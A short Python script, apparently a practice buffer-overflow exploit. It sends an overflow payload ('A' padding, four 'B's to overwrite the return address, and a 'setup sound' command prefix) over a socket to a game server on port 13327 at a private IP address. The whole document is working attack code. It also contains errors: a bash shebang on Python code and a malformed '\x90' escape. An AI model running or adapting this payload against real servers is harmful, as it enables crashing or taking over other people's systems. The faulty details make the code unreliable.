#!/bin/bash
import sys, socket



offset='A' * 4368 + 'B' * 4
pre_buff="\x11(setup sound "

post_buff = "x90\x00#"

try: 
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(('192.168.0.131',13327))
   print ("Sending payload to remote server..........")
   s.send((pre_buff + offset + post_buff))
   s.close()
   print("Payload send......")
            
except: 
   print("Error in connecting remote server........!")
   sys.exit()     